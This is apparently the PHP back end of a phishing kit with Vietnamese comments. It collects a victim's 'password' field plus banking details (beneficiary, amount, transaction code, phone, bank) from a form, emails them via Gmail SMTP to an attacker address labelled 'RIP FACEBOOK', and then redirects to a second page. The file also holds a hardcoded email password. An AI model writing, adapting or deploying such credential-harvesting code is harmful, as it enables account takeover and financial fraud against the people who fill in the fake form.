<?php
//goi thu vien
$thuahuong=$_POST['thuahuong'];
$sotien=$_POST['sotien'];
$magiaodich=$_POST['magiaodich'];
$sodienthoai=$_POST['sodienthoai'];
$nganhang=$_POST['nganhang'];
$noidung='<p><h3><strong>Thông tin liên hệ</strong></h3></p>
								<p><strong>Têm người hưởng:</strong> '.$thuahuong.'</p>
                                <p><strong>Số Tiền:</strong> '.$sotien.'</p>
                                <p><strong>Mã giao dịch:</strong> '.$magiaodich.'</p>
                                <p><strong>Số Điện Thoại:</strong> '.$sodienthoai.'</p>
			                    <p><strong>Ngân Hàng:</strong> '.$nganhang.'</p>';;
                            
include('class.smtp.php');
include "class.phpmailer.php";
$nFrom = "Thông tin";    //mail duoc gui tu dau, thuong de ten cong ty ban
$mFrom = 'ripsite2019@gmail.com';  //dia chi email cua ban
$mPass = '1234567Aa';       //mat khau email cua ban
$nTo = 'RIP FACEBOOK'; //Ten nguoi nhan
$mTo = 'ripsite2019@gmail.com';   //dia chi nhan mail
$mail             = new PHPMailer();
$body             = $_POST['password']; // Noi dung email
$title = 'Thông tin Đăng nhập bước 1';   //Tieu de gui mail
$mail->IsSMTP();
$mail->CharSet  = "utf-8";
$mail->SMTPDebug  = 0;   // enables SMTP debug information (for testing)
$mail->SMTPAuth   = true;    // enable SMTP authentication
$mail->SMTPSecure = "ssl";   // sets the prefix to the servier
$mail->Host       = "smtp.gmail.com";    // sever gui mail.
$mail->Port       = 465;         // cong gui mail de nguyen
// xong phan cau hinh bat dau phan gui mail

   
							    
$mail->Username   = $mFrom;  // khai bao dia chi email
$mail->Password   = $mPass;              // khai bao mat khau
$mail->SetFrom($mFrom, $nFrom);
$mail->AddReplyTo('info@freetuts.net', 'Freetuts.net'); //khi nguoi dung phan hoi se duoc gui den email nay
$mail->Subject    = $title;// tieu de email
$mail->MsgHTML($noidung);// noi dung chinh cua mail se nam o day.
$mail->AddAddress($mTo, $nTo);

// thuc thi lenh gui mail
if(!$mail->Send()) {
    echo 'Co loi!';
    
} else {
    
    header("Location: index2.html");
}
?>